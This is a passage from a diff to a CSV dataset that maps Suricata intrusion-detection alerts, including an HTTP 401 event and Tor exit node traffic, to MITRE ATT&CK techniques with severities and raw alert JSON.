+}","{""timestamp"": ""2018-03-23T16:25:23.232831-0600"", ""flow_id"": 620925549761330, ""pcap_cnt"": 586491, ""event_type"": ""alert"", ""src_ip"": ""10.240.105.57"", ""src_port"": 44391, ""dest_ip"": ""10.47.3.218"", ""dest_port"": 80, ""proto"": ""TCP"", ""tx_id"": 0, ""alert"": {""action"": ""allowed"", ""gid"": 1, ""signature_id"": 2020912, ""rev"": 2, ""severity"": 1}, ""http"": {""hostname"": ""10.47.3.218"", ""url"": ""/"", ""http_user_agent"": ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"", ""http_content_type"": ""text/plain"", ""http_method"": ""GET"", ""protocol"": ""HTTP/1.1"", ""status"": 401, ""length"": 16}, ""app_proto"": ""http"", ""flow"": {""pkts_toserver"": 7, ""pkts_toclient"": 4, ""bytes_toserver"": 1156, ""bytes_toclient"": 1344, ""start"": ""2018-03-23T16:25:23.217906-0600""}}"
+"suricata:2520098","suricata","ET TOR Known Tor Exit Node Traffic group 50","T1090.003","Multi-hop Proxy","T1090","Proxy","command-and-control","high","Tor exit node traffic","datasets/suricata/suricata_2520098_ET_TOR_Known_Tor_Exit_Node_Traffic_group_50_204.11.50.131_to_10.47.44.10_20180324_180051.json","{
+  ""timestamp"": ""2018-03-24T18:00:51.377604-0600"",
+  ""flow_id"": 1235081846041691,
+  ""pcap_cnt"": 843619,
+  ""event_type"": ""alert"",
+  ""src_ip"": ""204.11.50.131"",
+  ""src_port"": 9001,
+  ""dest_ip"": ""10.47.44.10"",
+  ""dest_port"": 49234,
+  ""proto"": ""TCP"",
+  ""alert"": {
+    ""action"": ""allowed"",
+    ""gid"": 1,
+    ""signature_id"": 2520098,
+    ""rev"": 3468,
+    ""signature"": ""ET TOR Known Tor Exit Node Traffic group 50"",
+    ""category"": ""Misc Attack"",
+    ""severity"": 2
+  },
+  ""vars"": {
+    ""flowbits"": {
+      ""ET.TorIP"": true
+    }
+  },
+  ""flow"": {
+    ""pkts_toserver"": 2,
+    ""pkts_toclient"": 1,
+    ""bytes_toserver"": 132,
+    ""bytes_toclient"": 66,
+    ""start"": ""2018-03-24T18:00:51.306267-0600""
+  }
+}","{""timestamp"": ""2018-03-24T18:00:51.377604-0600"", ""flow_id"": 1235081846041691, ""pcap_cnt"": 843619, ""event_type"": ""alert"", ""src_ip"": ""204.11.50.131"", ""src_port"": 9001, ""dest_ip"": ""10.47.44.10"", ""dest_port"": 49234, ""proto"": ""TCP"", ""alert"": {""action"": ""allowed"", ""gid"": 1, ""signature_id"": 2520098, ""rev"": 3468, ""severity"": 2}, ""vars"": {""flowbits"": {""ET.TorIP"": true}}, ""flow"": {""pkts_toserver"": 2, ""pkts_toclient"": 1, ""bytes_toserver"": 132, ""bytes_toclient"": 66, ""start"": ""2018-03-24T18:00:51.306267-0600""}}"
